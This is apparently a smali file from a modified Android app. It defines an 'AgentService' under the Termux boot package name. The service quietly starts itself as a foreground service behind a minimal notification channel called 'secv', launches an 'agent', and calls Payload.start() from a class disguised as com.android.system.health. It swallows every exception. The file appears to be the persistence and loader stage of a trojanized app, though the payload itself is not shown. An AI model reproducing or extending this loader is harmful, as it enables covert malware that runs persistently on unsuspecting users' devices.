.class public Lcom/termux/boot/AgentService;
.super Landroid/app/Service;


.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    # Create notification channel "secv" (required on API 26+)
    :try_ch_start
    const-string v0, "notification"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/NotificationManager;

    new-instance v1, Landroid/app/NotificationChannel;
    const-string v2, "secv"
    const-string v3, "secV"
    const/4 v4, 0x2
    invoke-direct {v1, v2, v3, v4}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_ch_end
    .catch Ljava/lang/Exception; {:try_ch_start .. :try_ch_end} :catch_ch
    :catch_ch

    # Call startForeground() with channel-backed notification
    :try_fg_start
    const/16 v0, 0x1
    new-instance v1, Landroid/app/Notification$Builder;
    const-string v2, "secv"
    invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
    move-result-object v1
    invoke-virtual {p0, v0, v1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_fg_end
    .catch Ljava/lang/Exception; {:try_fg_start .. :try_fg_end} :catch_fg
    :catch_fg

    invoke-static {}, Lcom/termux/boot/BootReceiver;->launchAgent()V

    :try_payload
    invoke-static {p0}, Lcom/android/system/health/Payload;->start(Landroid/content/Context;)V
    :try_payload_end
    .catch Ljava/lang/Exception; {:try_payload .. :try_payload_end} :catch_payload
    :catch_payload

    const/4 v0, 0x1

    return v0
.end method
